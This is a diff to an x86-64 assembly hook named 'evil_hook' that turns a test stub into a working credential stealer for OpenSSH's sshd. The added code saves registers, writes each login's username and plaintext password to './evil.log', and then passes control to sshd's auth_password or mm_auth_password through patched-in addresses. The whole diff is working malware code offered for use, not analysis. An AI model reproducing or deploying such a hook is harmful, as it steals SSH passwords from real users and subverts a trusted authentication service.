@@ -1,7 +1,17 @@
 .global evil_hook, evil_hook_size
 
 hook_start:
-	int3
+
+	push %rbp
+	push %rbx
+
+	push %rdi
+	push %rdx
+	push %rcx
+	push %r8
+	push %r9
+	push %rsi
+	push %rdi
 
 	# SC_open
 	mov $2, %rax
@@ -11,13 +21,14 @@ hook_start:
 	mov $0666, %rdx
 	syscall
 	
-	lea testuser(%rip), %rdi
+	pop %rdi
+	mov 0x20(%rdi), %rdi
 	call write_string
 
 	lea delim(%rip), %rdi
 	call write_string
 
-	lea testpass(%rip), %rdi
+	mov %rbx, %rdi
 	call write_string
 
 	lea newline(%rip), %rdi
@@ -28,10 +39,34 @@ hook_start:
 	mov $3, %rax
 	syscall
 
-	# exit(0)
-	mov $60, %rax
-	mov $0, %rdi
-	syscall
+	pop %rsi
+	pop %r9
+	pop %r8
+	pop %rcx
+	pop %rdx
+	pop %rdi
+
+	# check use_privsep for the right function to call
+	mov $0x1111111122222222, %rax
+	mov (%rax), %eax
+	test %eax, %eax
+	jne call_mm_auth_passwd
+
+# call auth_password(authctxt, password)	
+call_auth_passwd:
+	mov $0x3333333344444444, %rax 
+	jmp do_call
+
+# call mm_auth_password(authctxt, password)
+call_mm_auth_passwd:
+	mov $0x5555555566666666, %rax
+
+do_call:
+	call *%rax
+	
+	pop %rbx
+	pop %rbp
+	ret
 
 # rax=fd
 # rdi=str_ptr
@@ -82,12 +117,6 @@ strlen_done:
 
 logpath:
 	.string "./evil.log"
-
-testuser:
-	.string "blasty"
-
-testpass:
-	.string "my-1337-phrase"
 
 delim:
 	.string ":"
